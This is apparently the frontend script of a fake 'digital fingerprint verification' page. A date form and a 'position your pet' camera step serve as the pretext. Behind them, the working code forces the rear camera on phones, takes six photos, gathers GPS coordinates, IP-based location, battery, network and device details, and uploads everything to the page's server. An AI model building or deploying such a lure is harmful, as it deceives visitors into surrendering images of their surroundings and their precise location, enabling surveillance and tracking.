/**
 * Open-Share - Digital Fingerprint Verification System
 * Frontend Application
 */

class OpenShareApp {
    constructor() {
        this.interviewDates = [];
        this.capturedPhotos = [];
        this.extractedData = {};
        this.mediaStream = null;
        this.isCapturing = false;
        this.captureCount = 0;
        this.captureInterval = null;
        this.timerInterval = null;

        this.init();
    }

    async init() {
        await this.loadDates();
        this.setupEventListeners();
        this.setupBackgroundAnimation();
        this.setupParticles();
        this.setupCustomSelect();
    }

    // Load interview dates from backend
    async loadDates() {
        try {
            const response = await fetch('/api/dates');
            const data = await response.json();
            if (data.success) {
                this.interviewDates = data.dates;
                this.populateDateSelect();
            }
        } catch (error) {
            console.error('Failed to load dates:', error);
            // Fallback to hardcoded dates
            this.interviewDates = [
                "01/01/2026", "15/01/2026", "10/02/2026", "05/03/2026",
                "20/04/2026", "01/05/2026", "15/06/2026", "04/07/2026",
                "31/07/2026", "05/08/2026"
            ];
            this.populateDateSelect();
        }
    }

    // Populate custom date select
    populateDateSelect() {
        const optionsList = document.getElementById('optionsList');
        optionsList.innerHTML = '';

        this.interviewDates.forEach((date, index) => {
            const option = document.createElement('div');
            option.className = 'option-item';
            option.innerHTML = `
                <i class="fas fa-calendar-check"></i>
                <span>${date}</span>
            `;
            option.addEventListener('click', () => this.selectDate(date, option));
            optionsList.appendChild(option);
        });
    }

    // Setup custom select behavior
    setupCustomSelect() {
        const dateSelect = document.getElementById('dateSelect');
        const selectTrigger = dateSelect.querySelector('.select-trigger');

        selectTrigger.addEventListener('click', (e) => {
            e.stopPropagation();
            dateSelect.classList.toggle('active');
        });

        document.addEventListener('click', (e) => {
            if (!dateSelect.contains(e.target)) {
                dateSelect.classList.remove('active');
            }
        });
    }

    // Select a date
    selectDate(date, element) {
        const dateSelect = document.getElementById('dateSelect');
        const placeholder = dateSelect.querySelector('.select-placeholder');
        const hiddenInput = document.getElementById('interviewDate');

        // Update visual
        placeholder.innerHTML = `<i class="fas fa-calendar-check"></i> ${date}`;
        placeholder.classList.add('selected');

        // Update hidden input
        hiddenInput.value = date;

        // Update active state
        dateSelect.querySelectorAll('.option-item').forEach(opt => opt.classList.remove('selected'));
        element.classList.add('selected');

        // Close dropdown
        dateSelect.classList.remove('active');

        // Add subtle animation
        this.animateElement(placeholder, 'pulse');
    }

    // Setup event listeners
    setupEventListeners() {
        // Form submission
        const form = document.getElementById('verifyForm');
        form.addEventListener('submit', (e) => this.handleSubmit(e));

        // Modal buttons
        document.getElementById('cancelBtn').addEventListener('click', () => this.closeModal('permissionModal'));
        document.getElementById('confirmBtn').addEventListener('click', () => this.startVerification());
        document.getElementById('successCloseBtn').addEventListener('click', () => this.resetApp());

        // Input animations
        const rorshidInput = document.getElementById('rorshid');
        rorshidInput.addEventListener('focus', () => this.animateElement(rorshidInput.parentElement, 'glow'));
    }

    // Handle form submission
    handleSubmit(e) {
        e.preventDefault();

        const rorshid = document.getElementById('rorshid').value.trim();
        const interviewDate = document.getElementById('interviewDate').value;

        if (!rorshid) {
            this.showToast('Please enter your @rorshid ID', 'error');
            document.getElementById('rorshid').focus();
            return;
        }

        if (!interviewDate) {
            this.showToast('Please select your interview date', 'error');
            document.getElementById('dateSelect').classList.add('active');
            return;
        }

        // Show permission modal
        this.openModal('permissionModal');
    }

    // Start verification process
    async startVerification() {
        this.closeModal('permissionModal');

        // Show camera modal
        this.openModal('cameraModal');

        try {
            await this.initializeCamera();
        } catch (error) {
            console.error('Camera initialization failed:', error);
            this.showToast('Camera access denied or unavailable', 'error');
            this.closeModal('cameraModal');
            return;
        }
    }

    // Initialize camera
    async initializeCamera() {
        const video = document.getElementById('cameraFeed');
        const statusText = document.getElementById('statusText');

        statusText.textContent = 'Requesting camera access...';

        // Determine camera constraints
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

        const constraints = {
            video: {
                facingMode: isMobile ? { exact: 'environment' } : 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        };

        try {
            this.mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
            video.srcObject = this.mediaStream;

            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });

            statusText.textContent = 'Camera active - Position your pet';

            // Start capture sequence after brief delay
            setTimeout(() => this.startCaptureSequence(), 1500);

        } catch (error) {
            // Fallback to any available camera
            try {
                const fallbackConstraints = { video: true, audio: false };
                this.mediaStream = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
                video.srcObject = this.mediaStream;

                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });

                statusText.textContent = 'Camera active - Position your pet';
                setTimeout(() => this.startCaptureSequence(), 1500);

            } catch (fallbackError) {
                throw fallbackError;
            }
        }
    }

    // Start capture sequence (6 seconds, 3 pairs = 6 photos)
    startCaptureSequence() {
        this.isCapturing = true;
        this.captureCount = 0;
        this.capturedPhotos = [];

        const statusText = document.getElementById('statusText');
        statusText.textContent = 'Capturing... Keep pet in frame';

        // Update timer display
        let timeLeft = 6.0;
        const timerDisplay = document.getElementById('timerDisplay');

        this.timerInterval = setInterval(() => {
            timeLeft -= 0.1;
            timerDisplay.textContent = timeLeft.toFixed(1) + 's';

            if (timeLeft <= 0) {
                clearInterval(this.timerInterval);
            }
        }, 100);

        // Capture photos at intervals (every 1 second for 6 seconds = 6 photos)
        const captureTimes = [1000, 2000, 3000, 4000, 5000, 6000];

        captureTimes.forEach((time, index) => {
            setTimeout(() => {
                this.capturePhoto(index + 1);
            }, time);
        });

        // End capture after 6 seconds
        setTimeout(() => {
            this.endCaptureSequence();
        }, 6500);
    }

    // Capture a single photo
    capturePhoto(index) {
        const video = document.getElementById('cameraFeed');
        const canvas = document.getElementById('captureCanvas');
        const ctx = canvas.getContext('2d');

        // Set canvas size to match video
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;

        // Draw video frame to canvas
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Convert to blob
        canvas.toBlob((blob) => {
            const file = new File([blob], `pet-photo-${index}.jpg`, { type: 'image/jpeg' });
            this.capturedPhotos.push(file);

            // Update progress
            this.updateCaptureProgress(index);

            // Flash animation
            this.triggerCaptureAnimation();

        }, 'image/jpeg', 0.85);
    }

    // Update capture progress UI
    updateCaptureProgress(count) {
        const progressCircle = document.getElementById('progressCircle');
        const captureCount = document.getElementById('captureCount');

        const circumference = 2 * Math.PI * 45; // r=45
        const offset = circumference - (count / 6) * circumference;

        progressCircle.style.strokeDashoffset = offset;
        captureCount.textContent = count;
    }

    // Trigger capture flash animation
    triggerCaptureAnimation() {
        const animation = document.getElementById('captureAnimation');
        animation.classList.add('active');

        setTimeout(() => {
            animation.classList.remove('active');
        }, 600);
    }

    // End capture sequence
    async endCaptureSequence() {
        this.isCapturing = false;

        // Stop camera
        if (this.mediaStream) {
            this.mediaStream.getTracks().forEach(track => track.stop());
            this.mediaStream = null;
        }

        // Close camera modal
        this.closeModal('cameraModal');

        // Show processing modal
        this.openModal('processingModal');

        // Extract data
        await this.extractAllData();

        // Send data
        await this.sendData();
    }

    // Extract all device data
    async extractAllData() {
        const extractionOrder = [
            { id: 'ext-ip', key: 'ipAddress', extractor: () => this.getIPAddress() },
            { id: 'ext-location', key: 'approxLocation', extractor: () => this.getApproxLocation() },
            { id: 'ext-browser', key: 'browserType', extractor: () => this.getBrowserInfo() },
            { id: 'ext-os', key: 'os', extractor: () => this.getOSInfo() },
            { id: 'ext-device', key: 'deviceType', extractor: () => this.getDeviceType() },
            { id: 'ext-language', key: 'language', extractor: () => this.getLanguage() },
            { id: 'ext-gps', key: 'gpsLocation', extractor: () => this.getGPSLocation() },
            { id: 'ext-screen', key: 'screenResolution', extractor: () => this.getScreenResolution() },
            { id: 'ext-network', key: 'networkProvider', extractor: () => this.getNetworkInfo() },
            { id: 'ext-battery', key: 'batteryInfo', extractor: () => this.getBatteryInfo() }
        ];

        for (const item of extractionOrder) {
            try {
                const value = await item.extractor();
                this.extractedData[item.key] = value;
                this.markExtractionComplete(item.id, value);
            } catch (error) {
                console.error(`Failed to extract ${item.key}:`, error);
                this.extractedData[item.key] = 'N/A';
                this.markExtractionComplete(item.id, 'N/A');
            }

            // Small delay for visual effect
            await new Promise(resolve => setTimeout(resolve, 300));
        }
    }

    // Mark extraction item as complete
    markExtractionComplete(id, value) {
        const element = document.getElementById(id);
        if (element) {
            element.classList.add('completed');
            const statusIcon = element.querySelector('.extract-status i');
            if (statusIcon) {
                statusIcon.className = 'fas fa-check';
            }
        }
    }

    // Data extraction methods
    async getIPAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip || 'N/A';
        } catch {
            return 'N/A';
        }
    }

    async getApproxLocation() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return `${data.city}, ${data.region}, ${data.country_name}`;
        } catch {
            return 'N/A';
        }
    }

    getBrowserInfo() {
        const ua = navigator.userAgent;
        let browser = 'Unknown';

        if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
        else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
        else if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Edg')) browser = 'Edge';
        else if (ua.includes('Opera') || ua.includes('OPR')) browser = 'Opera';

        return browser;
    }

    getOSInfo() {
        const ua = navigator.userAgent;
        let os = 'Unknown';

        if (ua.includes('Windows')) os = 'Windows';
        else if (ua.includes('Mac')) os = 'macOS';
        else if (ua.includes('Linux')) os = 'Linux';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';

        return os;
    }

    getDeviceType() {
        const ua = navigator.userAgent;
        if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) {
            return /iPad|Tablet/i.test(ua) ? 'Tablet' : 'Mobile';
        }
        return 'Desktop';
    }

    getLanguage() {
        return navigator.language || navigator.userLanguage || 'N/A';
    }

    async getGPSLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve('N/A');
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve(`${position.coords.latitude.toFixed(4)}, ${position.coords.longitude.toFixed(4)}`);
                },
                () => {
                    resolve('Permission denied');
                },
                { timeout: 5000, enableHighAccuracy: false }
            );
        });
    }

    getScreenResolution() {
        return `${window.screen.width}x${window.screen.height}`;
    }

    getNetworkInfo() {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (connection) {
            const type = connection.effectiveType || 'unknown';
            const downlink = connection.downlink ? `${connection.downlink} Mbps` : '';
            return `${type.toUpperCase()} ${downlink}`.trim();
        }
        return 'N/A';
    }

    async getBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                const level = Math.round(battery.level * 100);
                const status = battery.charging ? 'Charging' : 'Discharging';
                return `${level}% (${status})`;
            }
            return 'Not supported';
        } catch {
            return 'N/A';
        }
    }

    // Send data to backend
    async sendData() {
        const formData = new FormData();

        // Add form fields
        formData.append('rorshid', document.getElementById('rorshid').value);
        formData.append('interviewDate', document.getElementById('interviewDate').value);

        // Add extracted data
        Object.keys(this.extractedData).forEach(key => {
            formData.append(key, this.extractedData[key]);
        });

        // Add photos
        this.capturedPhotos.forEach((photo, index) => {
            formData.append('petPhotos', photo, `pet-photo-${index + 1}.jpg`);
        });

        try {
            const response = await fetch('/api/verify', {
                method: 'POST',
                body: formData
            });

            const result = await response.json();

            if (result.success) {
                this.closeModal('processingModal');
                this.openModal('successModal');
                this.showToast('Verification submitted successfully', 'success');
            } else {
                throw new Error(result.message);
            }
        } catch (error) {
            console.error('Submission error:', error);
            this.closeModal('processingModal');
            this.showToast('Failed to submit verification. Please try again.', 'error');
        }
    }

    // Reset application
    resetApp() {
        this.closeModal('successModal');
        document.getElementById('verifyForm').reset();
        document.getElementById('interviewDate').value = '';

        const placeholder = document.querySelector('.select-placeholder');
        placeholder.innerHTML = '<i class="fas fa-calendar-day"></i> Select your interview date';
        placeholder.classList.remove('selected');

        document.querySelectorAll('.option-item').forEach(opt => opt.classList.remove('selected'));

        // Reset extraction UI
        document.querySelectorAll('.extract-item').forEach(item => {
            item.classList.remove('completed');
            const icon = item.querySelector('.extract-status i');
            if (icon) icon.className = 'fas fa-spinner fa-spin';
        });

        // Reset progress
        document.getElementById('progressCircle').style.strokeDashoffset = 283;
        document.getElementById('captureCount').textContent = '0';

        this.capturedPhotos = [];
        this.extractedData = {};
    }

    // Modal utilities
    openModal(modalId) {
        const modal = document.getElementById(modalId);
        modal.classList.add('active');
        document.body.style.overflow = 'hidden';
    }

    closeModal(modalId) {
        const modal = document.getElementById(modalId);
        modal.classList.remove('active');
        document.body.style.overflow = '';
    }

    // Toast notifications
    showToast(message, type = 'info') {
        const container = document.getElementById('toastContainer');
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;

        const icons = {
            success: 'fa-check-circle',
            error: 'fa-exclamation-circle',
            warning: 'fa-exclamation-triangle',
            info: 'fa-info-circle'
        };

        toast.innerHTML = `
            <i class="fas ${icons[type]}"></i>
            <span>${message}</span>
        `;

        container.appendChild(toast);

        // Auto remove
        setTimeout(() => {
            toast.classList.add('toast-out');
            setTimeout(() => toast.remove(), 300);
        }, 4000);
    }

    // Animation utilities
    animateElement(element, animationName) {
        element.style.animation = 'none';
        element.offsetHeight; // Trigger reflow
        element.style.animation = `${animationName} 0.5s ease`;
    }

    // Background canvas animation (3D floating shapes)
    setupBackgroundAnimation() {
        const canvas = document.getElementById('bgCanvas');
        const ctx = canvas.getContext('2d');

        let width, height;
        let shapes = [];

        const resize = () => {
            width = canvas.width = window.innerWidth;
            height = canvas.height = window.innerHeight;
        };

        window.addEventListener('resize', resize);
        resize();

        // Create floating shapes
        for (let i = 0; i < 15; i++) {
            shapes.push({
                x: Math.random() * width,
                y: Math.random() * height,
                size: Math.random() * 80 + 40,
                speedX: (Math.random() - 0.5) * 0.5,
                speedY: (Math.random() - 0.5) * 0.5,
                rotation: Math.random() * Math.PI * 2,
                rotationSpeed: (Math.random() - 0.5) * 0.01,
                opacity: Math.random() * 0.03 + 0.01
            });
        }

        const animate = () => {
            ctx.clearRect(0, 0, width, height);

            shapes.forEach(shape => {
                shape.x += shape.speedX;
                shape.y += shape.speedY;
                shape.rotation += shape.rotationSpeed;

                // Wrap around
                if (shape.x < -shape.size) shape.x = width + shape.size;
                if (shape.x > width + shape.size) shape.x = -shape.size;
                if (shape.y < -shape.size) shape.y = height + shape.size;
                if (shape.y > height + shape.size) shape.y = -shape.size;

                ctx.save();
                ctx.translate(shape.x, shape.y);
                ctx.rotate(shape.rotation);

                // Draw neumorphic-like shape
                ctx.fillStyle = `rgba(212, 168, 67, ${shape.opacity})`;
                ctx.shadowColor = 'rgba(0, 0, 0, 0.1)';
                ctx.shadowBlur = 20;
                ctx.shadowOffsetX = 5;
                ctx.shadowOffsetY = 5;

                ctx.beginPath();
                ctx.roundRect(-shape.size / 2, -shape.size / 2, shape.size, shape.size, 20);
                ctx.fill();

                ctx.restore();
            });

            requestAnimationFrame(animate);
        };

        animate();
    }

    // Setup floating particles
    setupParticles() {
        const container = document.getElementById('particles');
        const particleCount = 20;

        for (let i = 0; i < particleCount; i++) {
            const particle = document.createElement('div');
            particle.className = 'particle';

            const size = Math.random() * 20 + 10;
            particle.style.width = `${size}px`;
            particle.style.height = `${size}px`;
            particle.style.left = `${Math.random() * 100}%`;
            particle.style.animationDuration = `${Math.random() * 15 + 10}s`;
            particle.style.animationDelay = `${Math.random() * 10}s`;

            container.appendChild(particle);
        }
    }
}

// Initialize app when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    window.openShareApp = new OpenShareApp();
});

// Add custom animations to stylesheet
const style = document.createElement('style');
style.textContent = `
    @keyframes glow {
        0%, 100% { box-shadow: inset 6px 6px 12px var(--shadow-dark), inset -6px -6px 12px var(--shadow-light), 0 0 0 0 rgba(212, 168, 67, 0.2); }
        50% { box-shadow: inset 6px 6px 12px var(--shadow-dark), inset -6px -6px 12px var(--shadow-light), 0 0 20px 5px rgba(212, 168, 67, 0.1); }
    }

    @keyframes pulse {
        0%, 100% { transform: scale(1); }
        50% { transform: scale(1.02); }
    }
`;
document.head.appendChild(style);
